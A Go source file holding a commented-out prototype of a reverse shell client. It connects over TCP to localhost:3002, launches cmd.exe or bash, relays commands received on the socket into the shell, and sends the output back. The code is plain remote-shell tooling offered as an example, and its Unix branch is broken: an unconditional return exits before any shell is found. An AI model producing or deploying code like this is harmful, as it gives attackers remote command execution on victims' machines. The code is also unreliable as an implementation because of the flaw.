/*
This was the first prototype I did, it is a little bit dirty, and I though on deleting it
But I let it just in case someone wants to see how we could use Scanner to achieve the same goal
*/
package main
/*
import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
)

func fileExists(name string) bool {
	if _, err := os.Stat(name); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func main() {
	address := "localhost:3002"
	conn, err := net.Dial("tcp", address)

	if err != nil {
		panic(err.Error())
	}
	defer conn.Close()

	socketReader := bufio.NewScanner(conn)
	socketWriter := bufio.NewWriter(conn)

	var cmd string
	if runtime.GOOS == "windows" {
		cmd = "C:\\Windows\\System32\\cmd.exe"
		if !fileExists(cmd) {
			return
		}
	} else {
		cmd = "/bin/bash"
		shells := []string{
			"/bin/bash", "/bin/sh",
		}
		for _, shell := range shells {
			if (fileExists(shell)) {
				cmd = shell
				break
			}
		}
		// Not Found
		return
	}

	proc := exec.Command(cmd)

	stdin, err := proc.StdinPipe()
	if err != nil {
		panic(err.Error())
	}
	defer stdin.Close()
	stdout, _ := proc.StdoutPipe()
	defer stdout.Close()

	processReader := bufio.NewReader(stdout)
	processWriter := bufio.NewWriter(stdin)

	proc.Start()

	go func() {

		for socketReader.Scan() {
			command := socketReader.Text()
			processWriter.WriteString(fmt.Sprintf("%s\r\n", command))
			processWriter.Flush()
		}
	}()

	buffer := make([]byte, 1024)

	for true {
		bytesRead, err := processReader.Read(buffer)
		if err != nil {
			panic(err.Error())
		}
		if bytesRead <= 0 {
			panic("Error")
		}

		socketWriter.WriteString(string(buffer[:bytesRead]))
		socketWriter.Flush()
	}
}
*/